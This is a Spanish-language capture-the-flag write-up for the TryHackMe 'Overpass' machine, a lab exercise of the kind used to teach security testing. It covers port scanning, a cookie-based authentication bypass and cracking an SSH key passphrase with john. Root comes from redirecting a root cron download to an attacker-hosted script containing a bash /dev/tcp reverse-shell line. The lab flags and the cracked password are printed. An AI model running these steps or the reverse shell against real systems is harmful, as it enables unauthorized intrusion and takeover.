# Overpass

`Try Hack Me` `Linux` `Hacking Web` `OWASP10` `BrokenAuth` `cron`

## Flags

* **User Flag:** `THM{65c1aaf000506e56996822c6281e6bf7}`
* **Root Flag:** `THM{7f336f8c359dbac18d54fdd64ea753bb}`

## Users

* James _\(pwd de su id\_rsa: `james13`\)_

## **Enumeración**

Vemos si el host esta levantado y identificamos el SSOO con `ping -c1 IP`

> Linux: TTL &lt;= 64
>
> Windows: TTL &gt;= 65 & &lt;= 128

### Escaneo de puertos

Primero vemos si va muy lento el escaneo: `nmap -p- --open -T5 -v -n IP`

```text
-p-         Todos los puertos 
--open      Mostrar solos puertos abiertos 
-T5         Modo más agresivo 
-v          Modo verbose (reporta por pantalla) 
-n          No aplicar resolución DNS
```

Como va lento, lanzamos este otro comando: `nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP`

```text
-sS           Realizar un TCP SYN port scan
--min-rate    Emitir al menos 5000 paquetes por segundo
-Pn           No realizar Host Discovery
```

Va más rápido y encuentra los puertos 22 \(SSH\) y 80 \(HTTP\)

![](https://i.imgur.com/Kaxg51I.png)

Obtenemos los servicios que corren en los puertos `nmap -sC -sV -p22,80 IP`

![](https://i.imgur.com/SsspW1K.png)

### Servicio HTTP en Go

Lanzamos un whatweb para ver si tiene algún CMS tipo Wordpress: `whatweb IP`

![](https://i.imgur.com/FLhsX33.png)

Vemos que es un servidor web normal. Accedemos al portal web y vemos una página con un gestor de contraseñas.

![](https://i.imgur.com/JQWSW7L.png)

Vemos el código fuente de la página a ver si encontramos algo. No hay nada

Vamos a hacer un **fuzzing** en el portal para encontrar alguna ruta con **GoBuster**`gobuster dir -u IP -w DICT -q -n -e`

```text
-u        Target 
-w         Diccionario (/usr/share/wordlists/dirb/common.txt)
-q        Silencioso, no muestra mensajes de estado           
-n        No muestra códigos de estado        
-e        Muestra URLs completas
```

![](https://i.imgur.com/utFll3c.png)

Vemos un panel de administración **`IP/admin`**.

![](https://i.imgur.com/CGA609k.png)

En **`IP/downloads`** tenemos barios binarios, ejecutables y scripts para descargar.

Descargamos los binarios y vemos el código. Vemos que las contraseñas se guardan localmente y no se cifran, sólo están en **`ROT47`**.

## **OWASP 10**

Vemos en la info de la máquina que está relacionado con el Owasp Top 10.

{% embed url="https://wiki.owasp.org/images/5/5e/OWASP-Top-10-2017-es.pdf" %}



### SQLi y XSS

Comprobamos si el formulario de login es vulnerable a SQLi o XSS, pero vemos que no:

![](https://i.imgur.com/8vHHzXO.png)

![](https://i.imgur.com/F1yZp79.png)

Tampoco vemos variables en las URL donde se puedan inyectar comandos o HTML/JS.

### Datos sensibles

Al tratarse de un gestor de contraseñas, tal vez se hayan dejado algún fichero con contraseñas. Vemos en el código fuente descargado que las contraseñas se guardan en un fichero **`.overpass`**

![](https://i.imgur.com/gYKIEt8.png)

Probamos en todos los paths que conocemos por si existe este fichero en alguno, pero nada.

* IP/.overpass
* IP/admin/.overpass
* IP/downloads/.overpass
* IP/aboutus/.

> Como no vemos que se manden XML, descartamos las XXE. También las vulnerabilidades conocidas, porque no conocemos ningún servicio corriendo.

### Broken Auth / Broken Access

Vamos a intentar vulnerar el login con alguna mala configuración de acceso o autenticación.

> En el JS del login vemos una función **`login()`** que manda el POST a **`/api/login`** con las credenciales.
>
> Recibe la respuesta y si el texto del servidor contiene "_**Incorrect credentials**_" muestra error y sino, setea una cookie **`SessionToken`** con el valor devuelto por el servidor.
>
> ![](https://i.imgur.com/jD5Lka0.png)

Sabemos que se necesita la cookie **`SessionToken`** para poder acceder. Intentamos bypassear la autenticación seteando la cookie a cualquier cosa.

![](https://i.imgur.com/WvkGYwD.png)

Recargamos la URL **`/admin`** y conseguimos acceso al panel de Administración.

![](https://i.imgur.com/ZzPnQoE.png)

{% hint style="info" %}
Tenemos un usuario: **`James`**
{% endhint %}

## **Getting a shell**

Tenemos una clave privada SSH del usuario **James**, pero esta encriptada. Con john, intentamos crackear la password de la llave privada.

Primero, convertimos la Clave en un hash para john, con ssh2john

```text
#Convertir la clave a un hash
python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash

#Crack the password con Rockyou
/usr/sbin/john --wordlist=DICT id_rsa.hash
```

![](https://i.imgur.com/aeMKkZC.png)

{% hint style="info" %}
Tenemos la password del id\_rsa de **James**: **`james13`**
{% endhint %}

Tenemos ya un usuario/password, por lo que conectamos por SSH:

![](https://i.imgur.com/7rwoZau.png)

### **User Flag**

En el directorio de james vemos la **user.txt** flag.

{% hint style="success" %}
USER FLAG: **`thm{65c1aaf000506e56996822c6281e6bf7}`**
{% endhint %}

## **Privilege Escalation**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4):

{% embed url="https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4" caption="" %}

También podemos lanzar este [script ](https://github.com/rebootuser/LinEnum)para enumerar el sistema:

### Sudo and SUID files

En primer lugar, intentamos ver los privilegios de sudo del usuario james. No puede ejecutar el comando `sudo -l` sin su password.

Buscamos los ficheros con el SUID activo.

`find / -user root -perm -4000 2>/dev/null`

![](https://i.imgur.com/oGu4z3c.png)

No vemos nada raro.

### Cronjob

Lanzamos el script de enumeración de Linux anterior y exportamos el resultado a nuestra máquina.

En el directorio de James hemos visto un fichero **`todo.txt`** con tareas pendientes. En una de ellas habla de un script automático de construcción.

![](https://i.imgur.com/OTCcmGN.png)

En los resultados de la enumeración vemos un cron interesante. Cada minuto, se ejecuta como root el script **`buildscript.sh`** que podiamos descargar del portal, es decir, el que construia el binario desde el código fuente.

![](https://i.imgur.com/SpVvPgK.png)

No obstante, ese script lo está descargando del propio servidor web, pero utilizando el alias "**overpass.thm**".

### Resolv.conf

Modificamos el fichero resolv.conf para que "**overpass.thm**" sea nuestra IP. Vemos con ping que funciona.

![](https://i.imgur.com/tU7U6hm.png)

En el Kali, levantamos un servidor web con python donde se expone un fichero "downloads/src/buildscript.sh" con la siguiente shell reversa.

```text
/bin/bash -l > /dev/tcp/IP/5555 0<&1 2>&1
```

En Kali también, levantamos un puerto en escucha `nc -lvp 5555`.

![](https://i.imgur.com/VL1ukRs.png)

### **Root Flag**

Hemos escalado privilegios. Vamos al directorio **`/root`** a por la **root.txt** flag.

{% hint style="success" %}
ROOT FLAG: **`thm{7f336f8c359dbac18d54fdd64ea753bb}`**
{% endhint %}

